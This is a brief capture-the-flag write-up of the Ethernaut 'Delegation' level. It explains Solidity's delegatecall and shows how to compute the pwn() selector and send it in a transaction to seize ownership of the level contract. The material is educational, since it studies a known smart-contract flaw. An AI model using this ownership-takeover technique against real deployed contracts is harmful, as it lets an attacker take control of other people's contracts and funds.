# Delegation

The goal of this level is to claim ownership of the instance given.

A low level call: ```delegatecall()``` is to be made.

## What's delegatecall

It a way of a contract, say _contract A_, allowing another, _contract B_, to do whatever it wants with its storage. The call is executed in the context of the allowing contract, _contract A_.

## How do I get past this

There's a need for ```data```, which is a ```bytes4``` to be sent to be able to invoke the public function ```pwn()``` in the ```Delegate``` contract.

I got this bytes4 hash using a ```GetHash``` contract on Remix as stated below, employing _keccak256()_:

```solidity
pragma solidity ^0.4.10;

contract GetHash {
  function getHash() public pure returns (bytes4) {
    return bytes4(keccak256("pwn()"));
  }
}

```

The resulting hash after calling the ```getHash()``` method was sent to claim ownership:

```js
await contract.sendTransaction({ data: hash })

```
This helps resolved this level.

### Vulnerability

The delegating contract could have it storage messed with, if the contract receiving the delegation decides to be malicious.
